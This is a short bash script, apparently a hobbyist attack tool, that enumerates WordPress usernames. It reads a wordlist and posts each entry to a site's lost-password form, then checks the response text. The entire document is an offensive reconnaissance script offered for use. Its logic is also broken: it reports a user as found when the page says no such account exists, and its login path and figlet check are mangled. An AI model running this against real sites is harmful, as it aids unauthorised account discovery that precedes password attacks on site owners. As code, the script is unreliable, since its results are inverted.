#!/bin/bash

if ! figlet -v 2>/dev/null:;then
        echo "========> Word press user enumeration"
        echo "=======> by dummy click"

else
        figlet "W_P_U_E"
        echo "=====> by dummyclick"

fi

sleep 1

if [[ $# -lt 2 && $1 != "-h" ]]; then
        echo -e "\n\n=======> missing aruguments"
        echo -e  "\n=====> use -h for help"
        exit

elif [[ $1 == "-h" ]]; then
        echo "=======> Wordpress user enumeration"
        echo "====> by dummyclick"
        echo -e "\n\n\n====>syntax: word_user_enum.sh  wordlist url  (curl options -s,-v)"
        exit

fi
sleep 1
echo -e "\n\n"
while IFS= read -r word; do
        res=$(curl -X POST $3 -L "$2/wordpress/wuser_logilogin.php?action=lostpassword" -d "user_login=$word" | grep -i "There is no account with that username or email address")

        if [[ ! -z $res ]]; then
                echo "========> found a user"
                echo "========> user= $word"
                exit

        fi

done < $1

echo "=========> No user found"
